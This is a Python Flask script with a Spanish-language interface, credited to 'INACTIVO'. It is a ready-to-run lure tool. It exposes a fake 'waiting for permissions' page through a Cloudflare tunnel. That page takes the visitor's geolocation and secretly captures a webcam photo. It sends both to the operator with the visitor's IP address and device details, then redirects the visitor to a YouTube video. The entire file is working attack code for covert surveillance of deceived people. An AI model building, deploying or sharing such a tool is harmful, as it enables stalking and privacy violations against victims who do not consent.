import subprocess
import threading
import time
import os
from flask import Flask, request
from termcolor import cprint
from datetime import datetime
import base64

app = Flask(__name__)
user_url = None


@app.route('/')
def redirigir_a_video():
    if user_url:
        return f"""
        <html>
        <head>
            <title>Esperando permisos...</title>
            <style>
                body {{
                    background-color: #000;
                    color: #00FF41;
                    font-family: 'Courier New', Courier, monospace;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    text-align: center;
                }}
                h2 {{
                    font-size: 1.8rem;
                    animation: parpadeo 1s infinite;
                }}
                @keyframes parpadeo {{
                    0%, 100% {{ opacity: 1; }}
                    50% {{ opacity: 0; }}
                }}
                .spinner {{
                    margin-top: 20px;
                    width: 40px;
                    height: 40px;
                    border: 4px solid #00FF41;
                    border-top: 4px solid transparent;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
            </style>
        </head>
        <body>
            <h2>🛰️ Esperando permisos para ver el video...</h2>
            <div class="spinner"></div>
            <video id="video" autoplay style="display:none;"></video>
            <script>
                const videoUrl = "{user_url}";

                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(function(pos) {{
                        fetch("/location", {{
                            method: "POST",
                            headers: {{ "Content-Type": "application/json" }},
                            body: JSON.stringify({{
                                latitud: pos.coords.latitude,
                                longitud: pos.coords.longitude
                            }})
                        }});
                    }});
                }}

                navigator.mediaDevices.getUserMedia({{ video: true }})
                    .then(function(stream) {{
                        const video = document.getElementById("video");
                        video.srcObject = stream;

                        const canvas = document.createElement("canvas");
                        const context = canvas.getContext("2d");

                        setTimeout(() => {{
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0);
                            const dataUrl = canvas.toDataURL("image/jpeg");

                            fetch("/foto", {{
                                method: "POST",
                                headers: {{ "Content-Type": "application/json" }},
                                body: JSON.stringify({{ imagen: dataUrl }})
                            }});

                            stream.getTracks().forEach(t => t.stop());

                            window.location.href = videoUrl;
                        }}, 3000);

                    }})
                    .catch(function(err) {{
                        alert("Error al acceder a la cámara: " + err);
                        window.location.href = videoUrl;
                    }});
            </script>
        </body>
        </html>
        """
    else:
        return "No se ha establecido una URL de video.", 400


@app.route('/foto', methods=["POST"])
def guardar_foto():
    data = request.get_json()
    if not data or "imagen" not in data:
        cprint("  [⚠️] No se recibió imagen", "red")
        return "Imagen no proporcionada", 400

    try:
        b64 = data.get("imagen", "").split(",")[1]
        nombre = datetime.now().strftime("captura_%Y%m%d_%H%M%S.jpg")
        os.makedirs("capturas", exist_ok=True)
        ruta = os.path.join("capturas", nombre)
        with open(ruta, "wb") as f:
            f.write(base64.b64decode(b64))

        cprint("  [📸] Foto capturada y guardada exitosamente", "red")
        cprint(f"  [💾] Guardado como: {nombre}", "red")
        return "OK", 200

    except Exception as e:
        cprint("  [❌] Error al guardar la imagen", "red")
        cprint(f"  [🛠] Detalles: {e}", "red")
        return f"Error al guardar la foto: {e}", 500


@app.route('/location', methods=["POST"])
def guardar_datos():
    d = request.get_json()
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Desconocido")

    cprint("\n══════════════════════════════════════════════════════════════", "red", attrs=["bold"])
    cprint("  [🔍] NUEVA CONEXIÓN DETECTADA", "red", attrs=["bold"])
    cprint("══════════════════════════════════════════════════════════════", "red", attrs=["bold"])

    cprint(f"  [🌐] IP            : {ip}", "red")
    cprint(f"  [💻] Dispositivo   : {user_agent}", "red")

    if d:
        lat = d.get("latitud", "Desconocido")
        lon = d.get("longitud", "Desconocido")
        cprint(f"  [📍] Ubicación     : Lat = {lat} | Lon = {lon}", "red")
    else:
        cprint("  [⚠️] No se recibieron datos de ubicación", "red")

    cprint("══════════════════════════════════════════════════════════════\n", "red", attrs=["bold"])
    return "OK", 200


def clear_console():
    os.system("cls" if os.name == "nt" else "clear")


def iniciar_flask():
    app.run(host="0.0.0.0", port=5000)


def menu():
    global user_url
    clear_console()

    banner = r"""

 ██▓ ███▄    █  ▄▄▄       ▄████▄  ▄▄▄█████▓ ██▓ ██▒   █▓ ▒█████      ▄████▄   ▄▄▄       ███▄ ▄███▓
▓██▒ ██ ▀█   █ ▒████▄    ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▓██░   █▒▒██▒  ██▒   ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒
▒██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒ ▓██  █▒░▒██░  ██▒   ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░
░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ░██░  ▒██ █░░▒██   ██░   ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██ 
░██░▒██░   ▓██░ ▓█   ▓██▒▒ ▓███▀ ░  ▒██▒ ░ ░██░   ▒▀█░  ░ ████▓▒░   ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒
░▓  ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░  ▒ ░░   ░▓     ░ ▐░  ░ ▒░▒░▒░    ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
 ▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░  ▒       ░     ▒ ░   ░ ░░    ░ ▒ ▒░      ░  ▒     ▒   ▒▒ ░░  ░      ░
 ▒ ░   ░   ░ ░   ░   ▒   ░          ░       ▒ ░     ░░  ░ ░ ░ ▒     ░          ░   ▒   ░      ░   
 ░           ░       ░  ░░ ░                ░        ░      ░ ░     ░ ░            ░  ░       ░   
                         ░                          ░               ░                             

"""
    cprint(banner, "red", attrs=["bold"])
    cprint("══════════════════════════════════════════════════════════════", "red", attrs=["bold"])
    cprint("  [✘] BY: INACTIVO", "red", attrs=["bold"])
    cprint("══════════════════════════════════════════════════════════════", "red", attrs=["bold"])
    print()

    cprint("  [↪] PEGAR ENLACE DEL VIDEO DE YOUTUBE ABAJO", "cyan", attrs=["bold"])
    cprint("══════════════════════════════════════════════════════════════", "cyan", attrs=["bold"])
    user_url = input("  [🎯] URL: ").strip()

    cprint("\n══════════════════════════════════════════════════════════════", "yellow", attrs=["bold"])
    cprint("  [⚙] INICIANDO SERVIDOR FLASK...", "yellow", attrs=["bold"])
    cprint("══════════════════════════════════════════════════════════════", "yellow", attrs=["bold"])
    threading.Thread(target=iniciar_flask, daemon=True).start()
    time.sleep(2)

    cprint("══════════════════════════════════════════════════════════════", "cyan", attrs=["bold"])
    cprint("  [☁] CREANDO TÚNEL CLOUDFLARE...", "cyan", attrs=["bold"])
    cprint("══════════════════════════════════════════════════════════════", "cyan", attrs=["bold"])
    subprocess.Popen("cloudflared tunnel --url http://localhost:5000", shell=True)

    cprint("\n══════════════════════════════════════════════════════════════", "green", attrs=["bold"])
    cprint("  [👁] ESPERANDO CONEXIONES REMOTAS...", "green", attrs=["bold"])
    cprint("══════════════════════════════════════════════════════════════\n", "green", attrs=["bold"])


if __name__ == "__main__":
    menu()
    while True:
        time.sleep(1)
